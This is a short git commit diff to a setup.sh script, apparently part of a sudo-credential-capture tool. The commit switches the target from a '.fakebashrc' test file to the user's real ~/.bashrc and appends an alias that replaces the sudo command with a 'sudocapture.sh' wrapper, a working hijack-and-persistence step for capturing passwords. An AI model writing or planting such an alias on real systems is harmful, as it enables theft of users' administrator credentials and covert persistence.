07fd162edb68728c55448f573ec99118addbf5b9
magicweirdoo <github@simonpgw.eu.org>
2023-03-11 14:35:56 +0100

    fixed wrong bashrc file and alias declaration

--- setup.sh
+++ setup.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-echo "alias sudo=\"$(pwd)sudocapture.sh" >> /home/$(whoami)/.fakebashrc
-alias dudo="$(pwd)sudocapture.sh"
+echo "alias sudo=\"$(pwd)sudocapture.sh\"" >> /home/$(whoami)/.bashrc
+alias sudo="$(pwd)sudocapture.sh"
